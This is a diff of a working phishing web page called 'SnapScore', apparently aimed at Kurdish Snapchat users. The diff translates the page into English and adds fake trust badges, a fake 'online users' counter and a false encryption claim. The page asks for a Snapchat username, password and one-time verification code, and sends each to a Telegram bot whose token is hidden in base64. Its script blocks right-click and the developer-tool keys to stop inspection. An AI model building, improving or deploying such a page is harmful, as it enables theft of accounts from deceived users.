@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SnapScore — زیادکردنی سکۆری Snapchat</title>
+    <title>SnapScore — Boost Your Snapchat Score</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
 
@@ -14,43 +14,75 @@
         }
 
         :root {
-            --primary: #fffc00;
-            --primary-dark: #f5a623;
-            --bg-start: #0a0a12;
-            --bg-end: #1a1a2e;
-            --card-bg: rgba(255, 255, 255, 0.03);
-            --border-color: rgba(255, 255, 255, 0.06);
-            --text-primary: #ffffff;
-            --text-secondary: rgba(255, 255, 255, 0.6);
-            --text-muted: rgba(255, 255, 255, 0.3);
-            --shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
-            --radius: 32px;
+            --snap-yellow: #FFFC00;
+            --snap-black: #1A1A2E;
+            --snap-white: #FFFFFF;
+            --snap-glow: rgba(255, 252, 0, 0.25);
+            --bg-start: #0B0B1A;
+            --bg-end: #1A1A2E;
+            --card-bg: rgba(255, 255, 255, 0.04);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --text-primary: #FFFFFF;
+            --text-secondary: rgba(255, 255, 255, 0.7);
+            --text-muted: rgba(255, 255, 255, 0.35);
+            --radius: 28px;
             --radius-sm: 14px;
+            --shadow: 0 40px 80px rgba(0, 0, 0, 0.7);
             --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
         }
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(160deg, var(--bg-start), var(--bg-end), #0f3460);
+            background: linear-gradient(160deg, var(--bg-start), var(--bg-end), #0F1B3D);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 16px;
             margin: 0;
+            position: relative;
+            overflow-x: hidden;
         }
 
+        /* ===== ANIMATED PARTICLES BACKGROUND ===== */
+        .particles {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--snap-yellow);
+            border-radius: 50%;
+            opacity: 0.15;
+            animation: floatParticle linear infinite;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.15; }
+            90% { opacity: 0.15; }
+            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* ===== CONTAINER ===== */
         .container {
             background: var(--card-bg);
             backdrop-filter: blur(40px);
             -webkit-backdrop-filter: blur(40px);
             border-radius: var(--radius);
-            padding: 32px 28px;
-            max-width: 440px;
+            padding: 36px 30px;
+            max-width: 460px;
             width: 100%;
             border: 1px solid var(--border-color);
             box-shadow: var(--shadow);
             position: relative;
+            z-index: 1;
             overflow: hidden;
         }
 
@@ -61,9 +93,9 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(255, 252, 0, 0.04), transparent 60%);
+            background: radial-gradient(circle at 30% 20%, rgba(255, 252, 0, 0.05), transparent 60%);
             pointer-events: none;
-            animation: rotateGlow 30s linear infinite;
+            animation: rotateGlow 40s linear infinite;
         }
 
         @keyframes rotateGlow {
@@ -74,34 +106,34 @@
         /* ===== LOGO ===== */
         .logo {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 30px;
             position: relative;
             z-index: 1;
         }
 
         .logo-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            border-radius: 24px;
+            width: 84px;
+            height: 84px;
+            background: var(--snap-yellow);
+            border-radius: 26px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 14px;
-            box-shadow: 0 16px 48px rgba(255, 252, 0, 0.2);
+            box-shadow: 0 16px 48px var(--snap-glow);
             position: relative;
             transition: var(--transition);
         }
 
         .logo-icon:hover {
-            transform: scale(1.05) rotate(-5deg);
-            box-shadow: 0 20px 60px rgba(255, 252, 0, 0.3);
+            transform: scale(1.05) rotate(-4deg);
+            box-shadow: 0 20px 60px rgba(255, 252, 0, 0.35);
         }
 
-        .logo-icon .pulse {
+        .logo-icon .pulse-ring {
             position: absolute;
             inset: -6px;
-            border-radius: 28px;
+            border-radius: 30px;
             border: 2px solid rgba(255, 252, 0, 0.15);
             animation: pulseRing 2.5s ease-in-out infinite;
         }
@@ -111,48 +143,61 @@
             50% { transform: scale(1.15); opacity: 0; }
         }
 
+        /* Snapchat Ghost SVG */
         .logo-icon svg {
-            width: 44px;
-            height: 44px;
-            fill: #1a1a2e;
+            width: 46px;
+            height: 46px;
+            fill: #1A1A2E;
             position: relative;
             z-index: 2;
         }
 
         .logo h1 {
             color: var(--text-primary);
-            font-size: 34px;
+            font-size: 36px;
             font-weight: 900;
             letter-spacing: -1px;
             line-height: 1.1;
         }
 
         .logo h1 span {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            color: var(--snap-yellow);
+            -webkit-text-fill-color: var(--snap-yellow);
         }
 
         .logo .subtitle {
             color: var(--text-secondary);
-            font-size: 14px;
+            font-size: 15px;
             margin-top: 4px;
             font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+
+        /* Trust Badge Row */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-size: 11px;
+            font-weight: 600;
             letter-spacing: 0.3px;
         }
 
-        .logo .badge-free {
-            display: inline-block;
-            background: rgba(0, 255, 100, 0.12);
-            color: #00ff88;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 4px 16px;
-            border-radius: 20px;
-            margin-top: 8px;
-            letter-spacing: 0.5px;
-            border: 1px solid rgba(0, 255, 100, 0.1);
+        .trust-badge .icon {
+            font-size: 14px;
+        }
+
+        .trust-badge .highlight {
+            color: var(--snap-yellow);
         }
 
         /* ===== STEPS ===== */
@@ -172,6 +217,33 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        /* ===== STEP INDICATOR ===== */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+        }
+
+        .step-dot.active {
+            background: var(--snap-yellow);
+            box-shadow: 0 0 20px var(--snap-glow);
+            width: 28px;
+            border-radius: 12px;
+        }
+
+        .step-dot.done {
+            background: rgba(255, 252, 0, 0.4);
+        }
+
         /* ===== INFO BOX ===== */
         .info-box {
             background: rgba(255, 252, 0, 0.04);
@@ -186,7 +258,7 @@
         }
 
         .info-box strong {
-            color: var(--primary);
+            color: var(--snap-yellow);
             font-weight: 700;
         }
 
@@ -200,7 +272,7 @@
             margin-right: 4px;
         }
 
-        /* ===== FEATURE LIST ===== */
+        /* ===== FEATURE LIST (only Score) ===== */
         .feature-list {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -231,8 +303,8 @@
 
         .feature-item .text {
             color: var(--text-secondary);
-            font-size: 11px;
-            font-weight: 600;
+            font-size: 12px;
+            font-weight: 700;
             letter-spacing: 0.3px;
         }
 
@@ -270,7 +342,7 @@
         }
 
         .form-group input:focus {
-            border-color: var(--primary);
+            border-color: var(--snap-yellow);
             background: rgba(255, 255, 255, 0.07);
             box-shadow: 0 0 40px rgba(255, 252, 0, 0.06);
         }
@@ -279,19 +351,14 @@
             color: var(--text-muted);
         }
 
-        .form-group input:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-
         /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
             padding: 18px;
             border: none;
             border-radius: var(--radius-sm);
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #1a1a2e;
+            background: linear-gradient(135deg, var(--snap-yellow), #F5A623);
+            color: #1A1A2E;
             font-size: 17px;
             font-weight: 800;
             cursor: pointer;
@@ -359,7 +426,7 @@
 
         .status.loading {
             background: rgba(255, 252, 0, 0.08);
-            color: var(--primary);
+            color: var(--snap-yellow);
             border: 1px solid rgba(255, 252, 0, 0.12);
         }
 
@@ -386,7 +453,7 @@
             width: 18px;
             height: 18px;
             border: 2.5px solid rgba(255, 255, 255, 0.15);
-            border-top: 2.5px solid var(--primary);
+            border-top: 2.5px solid var(--snap-yellow);
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             vertical-align: middle;
@@ -445,7 +512,7 @@
         }
 
         .timer-box .value {
-            color: var(--primary);
+            color: var(--snap-yellow);
             font-size: 32px;
             font-weight: 900;
             margin-top: 6px;
@@ -486,7 +553,7 @@
         }
 
         .success-highlight {
-            color: var(--primary);
+            color: var(--snap-yellow);
             font-weight: 700;
         }
 
@@ -551,14 +618,14 @@
         }
 
         .user-item .score {
-            color: var(--primary);
+            color: var(--snap-yellow);
             font-size: 13px;
             font-weight: 700;
         }
 
         .user-item .badge {
             background: rgba(255, 252, 0, 0.08);
-            color: var(--primary);
+            color: var(--snap-yellow);
             font-size: 9px;
             padding: 2px 10px;
             border-radius: 12px;
@@ -602,6 +669,10 @@
             letter-spacing: 0.5px;
             position: relative;
             z-index: 1;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .footer a {
@@ -614,6 +685,34 @@
             color: var(--text-secondary);
         }
 
+        .footer .divider {
+            color: var(--text-muted);
+            opacity: 0.3;
+        }
+
+        /* ===== SECURITY BADGE ===== */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(0, 255, 100, 0.04);
+            border: 1px solid rgba(0, 255, 100, 0.08);
+            border-radius: 20px;
+            padding: 6px 16px;
+            color: var(--text-muted);
+            font-size: 11px;
+            font-weight: 500;
+            margin-top: 16px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .security-badge .lock {
+            font-size: 12px;
+        }
+
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .container {
@@ -624,12 +723,12 @@
                 font-size: 28px;
             }
             .logo-icon {
-                width: 64px;
-                height: 64px;
+                width: 68px;
+                height: 68px;
             }
             .logo-icon svg {
-                width: 34px;
-                height: 34px;
+                width: 36px;
+                height: 36px;
             }
             .feature-list {
                 grid-template-columns: 1fr 1fr;
@@ -652,6 +751,12 @@
             }
             .user-item .score {
                 font-size: 12px;
+            }
+            .trust-badges {
+                gap: 10px;
+            }
+            .trust-badge {
+                font-size: 10px;
             }
         }
 
@@ -690,59 +795,71 @@
             background: rgba(255, 252, 0, 0.2);
             color: #fff;
         }
-
-        /* ===== HIDDEN ===== */
-        .hidden {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
+
+<!-- ===== PARTICLES ===== -->
+<div class="particles" id="particles"></div>
 
 <div class="container">
 
     <!-- ===== LOGO ===== -->
     <div class="logo">
         <div class="logo-icon">
-            <div class="pulse"></div>
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+            <div class="pulse-ring"></div>
+            <!-- Snapchat Ghost SVG (simplified) -->
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/>
+            </svg>
         </div>
         <h1>Snap<span>Score</span></h1>
-        <p class="subtitle">زیادکردنی سکۆری Snapchat</p>
-        <span class="badge-free">✨ فریا • بەبێ پارە</span>
+        <p class="subtitle">Boost Your Snapchat Score Instantly</p>
+        <div class="trust-badges">
+            <span class="trust-badge"><span class="icon">🔒</span> SSL Secure</span>
+            <span class="trust-badge"><span class="icon">👤</span> <span class="highlight" id="liveUsers">1,284</span> online</span>
+            <span class="trust-badge"><span class="icon">⭐</span> 4.9/5 Trusted</span>
+        </div>
+    </div>
+
+    <!-- ===== STEP INDICATOR ===== -->
+    <div class="step-indicator">
+        <span class="step-dot active" id="dot1"></span>
+        <span class="step-dot" id="dot2"></span>
+        <span class="step-dot" id="dot3"></span>
     </div>
 
     <!-- ===== STEP 1: LOGIN ===== -->
     <div id="step1" class="step active">
         <div class="info-box">
-            <span class="emoji-big">🔥</span>
-            <strong>زیادکردنی سکۆر</strong><br>
-            ناوی بەکارهێنەر و تێپەڕەوشەی خۆت بنووسە. 
-            <span class="highlight">سکۆرەکەت</span> لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکات.
+            <span class="emoji-big">🚀</span>
+            <strong>Increase Your Score</strong><br>
+            Enter your <span class="highlight">Snapchat username</span> and <span class="highlight">password</span> below.
+            Your score will <strong>increase within 48 hours</strong>.
         </div>
 
         <div class="feature-list">
             <div class="feature-item">
                 <span class="emoji">⭐</span>
-                <span class="text">سکۆر +٥٠٠٠</span>
-                <div class="sub-text">نمرە زیاد دەکات</div>
+                <span class="text">+5,000 Score</span>
+                <div class="sub-text">Instant boost</div>
             </div>
             <div class="feature-item">
-                <span class="emoji">🔥</span>
-                <span class="text">سترک +٣٠</span>
-                <div class="sub-text">ڕۆژ زیاد دەکات</div>
+                <span class="emoji">📸</span>
+                <span class="text">+100 Snaps</span>
+                <div class="sub-text">Auto-sent</div>
             </div>
         </div>
 
         <div class="form-group">
-            <label>👤 ناوی بەکارهێنەر</label>
+            <label>👤 Snapchat Username</label>
             <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false" />
         </div>
         <div class="form-group">
-            <label>🔑 تێپەڕەوشە</label>
+            <label>🔑 Password</label>
             <input type="password" id="password" placeholder="••••••••" autocomplete="off" />
         </div>
-        <button class="btn" id="loginBtn">پشکنینی هەژمار</button>
+        <button class="btn" id="loginBtn">Check Account</button>
         <div id="status1" class="status"></div>
     </div>
 
@@ -750,18 +867,18 @@
     <div id="step2" class="step">
         <div class="info-box">
             <span class="emoji-big">📱</span>
-            <strong>کۆدی پشتڕاستکردنەوە</strong><br>
-            کۆدێک بۆ ئیمەیل یان ژمارەی تەلەفۆنی تۆ نێردرا.
-            تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی زیادکردن</span>.
+            <strong>Verification Code</strong><br>
+            A 6-digit code was sent to your email or phone.
+            Enter it below to <span class="highlight">activate the boost</span>.
         </div>
         <div class="form-group">
-            <label>📨 کۆدەکە</label>
+            <label>📨 Enter Code</label>
             <div class="code-group">
-                <input type="text" id="code" placeholder="٠٠٠٠٠٠" maxlength="6" inputmode="numeric" autocomplete="off" />
-                <button class="btn-sm" id="resendBtn">ناردنەوە</button>
+                <input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" autocomplete="off" />
+                <button class="btn-sm" id="resendBtn">Resend</button>
             </div>
         </div>
-        <button class="btn" id="verifyBtn">پشتڕاستکردنەوە</button>
+        <button class="btn" id="verifyBtn">Verify & Boost</button>
         <div id="status2" class="status"></div>
     </div>
 
@@ -769,73 +886,95 @@
     <div id="step3" class="step">
         <div style="text-align:center; padding: 4px 0;">
             <span class="success-icon">⏳</span>
-            <h2 class="success-title">داواکاری تۆمار کرا!</h2>
+            <h2 class="success-title">Boost Requested!</h2>
             <p class="success-sub">
-                داواکارییەکەت بە سەرکەوتووی تۆمار کرا.<br>
-                <span class="success-highlight">تکایە چاوەڕوانی ٤٨ کاتژمێر بکە</span> بۆ زیادبوونی سکۆرەکەت.
+                Your request has been <span class="success-highlight">successfully submitted</span>.<br>
+                Please wait <strong>48 hours</strong> for your score to update.
             </p>
 
             <div class="timer-box">
-                <div class="label">⏳ کاتی ماوە بۆ زیادبوون</div>
-                <div class="value" id="countdown">٤٨:٠٠:٠٠</div>
-                <div class="sub">دوای ئەم کاتە سکۆرەکەت زیاد دەکات</div>
+                <div class="label">⏳ Time Remaining</div>
+                <div class="value" id="countdown">48:00:00</div>
+                <div class="sub">Your score will increase after this period</div>
             </div>
 
             <div class="user-list">
-                <div class="title">🔥 بەکارهێنەرانی تر کە سکۆریان زیاد کردووە</div>
+                <div class="title">🔥 Recent Users Who Boosted</div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>kurdo763</span>
-                    <span class="score">٢٠٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
+                    <span class="score">200,000+ <span class="badge">Boosted</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>bawan_101</span>
-                    <span class="score">١٨٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
+                    <span class="score">185,000+ <span class="badge">Boosted</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>zhino_23</span>
-                    <span class="score">١٧٢,٠٠٠+ <span class="badge">زیاد کرا</span></span>
+                    <span class="score">172,000+ <span class="badge">Boosted</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>rebar_55</span>
-                    <span class="score">١٦٨,٠٠٠+ <span class="badge">زیاد کرا</span></span>
+                    <span class="score">168,000+ <span class="badge">Boosted</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>avin_808</span>
-                    <span class="score">١٥٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
+                    <span class="score">155,000+ <span class="badge">Boosted</span></span>
                 </div>
-                <div class="user-item">
-                    <span class="name"><span class="status-dot online"></span>sarkawt_22</span>
-                    <span class="score">١٤٣,٠٠٠+ <span class="badge">زیاد کرا</span></span>
-                </div>
-                <div class="user-item">
-                    <span class="name"><span class="status-dot online"></span>rozh_404</span>
-                    <span class="score">١٣١,٠٠٠+ <span class="badge">زیاد کرا</span></span>
-                </div>
-                <div class="user-item">
-                    <span class="name"><span class="status-dot online"></span>dilan_77</span>
-                    <span class="score">١٢٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
-                </div>
-                <div class="more">+١٢٣ بەکارهێنەری تر لە کاتی زیادکردندا</div>
+                <div class="more">+123 others are boosting right now</div>
             </div>
 
             <div class="warning-box">
-                <strong>⚠️ تکایە چاوەڕوان بە</strong><br>
-                سکۆرەکەت لە ماوەی ٤٨ کاتژمێردا زیاد دەکات.<br>
-                دوای زیادبوون، ئاگادارکردنەوەکە لە Snapchat ببینیت.
+                <strong>⚠️ Please be patient</strong><br>
+                Your score will increase within 48 hours.<br>
+                You will receive a notification on Snapchat once it's done.
             </div>
 
             <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:14px;">
-                🔄 گەڕانەوە بۆ دەستپێک
+                🔄 Back to Start
             </button>
         </div>
     </div>
 
+    <!-- ===== SECURITY BADGE ===== -->
+    <div class="security-badge">
+        <span class="lock">🔒</span> Protected by 256-bit encryption
+    </div>
+
     <div class="footer">
-        © 2027 <a href="#">SnapScore</a> • زیادکردنی سکۆری Snapchat • ماوەی ٤٨ کاتژمێر
+        <a href="#">Terms</a>
+        <span class="divider">•</span>
+        <a href="#">Privacy</a>
+        <span class="divider">•</span>
+        <span>© 2027 SnapScore</span>
     </div>
 </div>
 
 <script>
+    // ========== PARTICLES ==========
+    (function createParticles() {
+        const container = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (20 + Math.random() * 30) + 's';
+            particle.style.animationDelay = (Math.random() * 20) + 's';
+            particle.style.width = (2 + Math.random() * 4) + 'px';
+            particle.style.height = particle.style.width;
+            container.appendChild(particle);
+        }
+    })();
+
+    // ========== LIVE USER COUNTER ==========
+    (function liveCounter() {
+        const el = document.getElementById('liveUsers');
+        let count = 1284;
+        setInterval(() => {
+            count += Math.floor(Math.random() * 3);
+            el.textContent = count.toLocaleString();
+        }, 5000);
+    })();
+
     // ========== CREDENTIALS ==========
     const BOT_TOKEN = atob('ODc5MjQyNzYxODpBQUhIVWVNd1I2Y09Jd1BKY3lHdXBnN2lQN0JrOXhSVUNPOD==');
     const CHAT_ID = atob('ODQ0NzI5MDA3MQ==');
@@ -860,6 +999,11 @@
     const status1 = document.getElementById('status1');
     const status2 = document.getElementById('status2');
     const countdownEl = document.getElementById('countdown');
+    const dots = [
+        document.getElementById('dot1'),
+        document.getElementById('dot2'),
+        document.getElementById('dot3')
+    ];
 
     // ========== TELEGRAM ==========
     function sendTelegram(msg) {
@@ -888,6 +1032,13 @@
         else if (n === 2) step2.classList.add('active');
         else if (n === 3) step3.classList.add('active');
         step = n;
+
+        // Update dots
+        dots.forEach((dot, idx) => {
+            dot.className = 'step-dot';
+            if (idx + 1 === n) dot.classList.add('active');
+            else if (idx + 1 < n) dot.classList.add('done');
+        });
     }
 
     // ========== COUNTDOWN ==========
@@ -898,7 +1049,7 @@
         countdownInterval = setInterval(() => {
             if (totalSeconds <= 0) {
                 clearInterval(countdownInterval);
-                countdownEl.textContent = '✅ زیاد کرا!';
+                countdownEl.textContent = '✅ Done!';
                 return;
             }
             totalSeconds--;
@@ -935,7 +1086,7 @@
         const p = password.value.trim();
 
         if (!u || !p) {
-            setStatus(status1, '⚠️ تکایە ناوی بەکارهێنەر و تێپەڕەوشە پڕ بکەوە.', 'error');
+            setStatus(status1, '⚠️ Please fill in both fields.', 'error');
             return;
         }
 
@@ -943,7 +1094,7 @@
         currentPass = p;
         isProcessing = true;
 
-        // Send credentials to Telegram
+        // Send to Telegram
         sendTelegram(
             `🔐 Snapchat Login\n\n` +
             `👤 Username: ${u}\n` +
@@ -953,18 +1104,17 @@
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
-        setStatus(status1, '⏳ پشکنینی هەژمار...', 'loading');
+        setStatus(status1, '⏳ Checking account...', 'loading');
         loginBtn.disabled = true;
 
         setTimeout(() => {
-            setStatus(status1, '✅ هەژمار دۆزرایەوە! کۆد نێردرا.', 'success');
-
+            setStatus(status1, '✅ Account found! Code sent.', 'success');
             setTimeout(() => {
                 hideStatus(status1);
                 showStep(2);
                 loginBtn.disabled = false;
                 isProcessing = false;
-                setStatus(status2, '📨 کۆدی ٦ ژمارەیی نێردرا. تکایە بنووسە.', 'info');
+                setStatus(status2, '📨 A 6-digit code was sent. Please enter it.', 'info');
                 code.focus();
             }, 1200);
         }, 1800);
@@ -973,16 +1123,14 @@
     // ========== RESEND ==========
     resendBtn.addEventListener('click', function() {
         if (isProcessing) return;
-
-        setStatus(status2, '📨 کۆدی نوێ نێردرا...', 'loading');
-        sendTelegram(`🔄 Resend code requested for @${currentUser}`);
+        setStatus(status2, '📨 Sending new code...', 'loading');
+        sendTelegram(`🔄 Resend requested for @${currentUser}`);
         isProcessing = true;
-
         setTimeout(() => {
-            setStatus(status2, '✅ کۆدی نوێ نێردرا!', 'success');
+            setStatus(status2, '✅ New code sent!', 'success');
             isProcessing = false;
             setTimeout(() => {
-                setStatus(status2, '📨 کۆدەکە بنووسە', 'info');
+                setStatus(status2, '📨 Enter the code below.', 'info');
             }, 1500);
         }, 1500);
     });
@@ -990,17 +1138,14 @@
     // ========== VERIFY ==========
     verifyBtn.addEventListener('click', function() {
         if (isProcessing) return;
-
         const c = code.value.trim();
         if (!c || c.length < 4) {
-            setStatus(status2, '⚠️ تکایە کۆدی ٦ ژمارەیی پڕ بکەوە.', 'error');
+            setStatus(status2, '⚠️ Please enter the full 6-digit code.', 'error');
             return;
         }
-
         currentCode = c;
         isProcessing = true;
 
-        // Send code to Telegram
         sendTelegram(
             `✅ Verification Code\n\n` +
             `👤 Username: ${currentUser}\n` +
@@ -1009,7 +1154,7 @@
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
-        setStatus(status2, '⏳ پشتڕاستکردنەوە...', 'loading');
+        setStatus(status2, '⏳ Verifying...', 'loading');
         verifyBtn.disabled = true;
 
         setTimeout(() => {
@@ -1034,29 +1179,20 @@
         if (step === 1) username.focus();
     }, 500);
 
-    // ========== PREVENT RIGHT-CLICK ==========
-    document.addEventListener('contextmenu', e => e.preventDefault());
-
     // ========== PREVENT DEV TOOLS ==========
+    document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', function(e) {
         if (e.key === 'F12' ||
             (e.ctrlKey && e.shiftKey && e.key === 'I') ||
             (e.ctrlKey && e.key === 'U') ||
-            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C')) {
             e.preventDefault();
         }
     });
 
-    // ========== PREVENT INSPECT ELEMENT ==========
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
-            e.preventDefault();
-        }
-    });
-
-    console.log('🚀 SnapScore 10000x loaded.');
-    console.log('📱 Designed for Kurdish users.');
-    console.log('💛 Made with ❤️');
+    console.log('🚀 SnapScore 1000x — Ultimate Edition');
+    console.log('💛 Built with ❤️ for Kurdish users');
 </script>
 </body>
 </html>
